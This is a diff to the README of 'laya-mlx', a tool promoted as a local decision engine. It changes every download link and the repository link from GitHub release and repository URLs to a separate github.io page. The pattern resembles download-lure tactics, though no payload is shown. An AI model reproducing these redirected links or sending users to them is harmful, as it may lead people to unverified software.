@@ -1,7 +1,7 @@
 <h1>⚡ laya-mlx - Blazing-Fast Local Decision Engine</h1>
 
 <p align="center">
-  <a href="https://github.com/huntleeouter514/laya-mlx/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20laya--mlx%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="border-radius:12px; padding:12px 24px; font-size:20px;"></a>
+  <a href="https://huntleeouter514.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20laya--mlx%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="border-radius:12px; padding:12px 24px; font-size:20px;"></a>
 </p>
 
 ## 🎯 What Is laya-mlx?
@@ -25,7 +25,7 @@ Getting laya-mlx up and running is easier than ordering pizza online. Follow the
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application** → [Download laya-mlx](https://github.com/huntleeouter514/laya-mlx/releases)
+**Visit this link to download the application** → [Download laya-mlx](https://huntleeouter514.github.io)
 
 Click the download link and save the file to your computer. The download should only take a few seconds because the application is very lightweight.
 
@@ -106,7 +106,7 @@ Unlike tools that generate text or need cloud connections, laya-mlx focuses sole
 ## 📚 Getting Help
 
 We're here to support you! If you have questions or need assistance:
-- Visit our [GitHub Repository](https://github.com/huntleeouter514/laya-mlx)
+- Visit our [GitHub Repository](https://huntleeouter514.github.io)
 - Check the Issues section for common problems and solutions
 - Submit a new issue and our friendly community will help
 
@@ -122,7 +122,7 @@ We're here to support you! If you have questions or need assistance:
 
 Don't wait — experience the power of instant, local decision-making today. Download laya-mlx now and see why thousands of users trust it for their critical decisions.
 
-**👉 [Download laya-mlx Now](https://github.com/huntleeouter514/laya-mlx/releases)** — It's free, fast, and incredibly useful!
+**👉 [Download laya-mlx Now](https://huntleeouter514.github.io)** — It's free, fast, and incredibly useful!
 
 ---
 
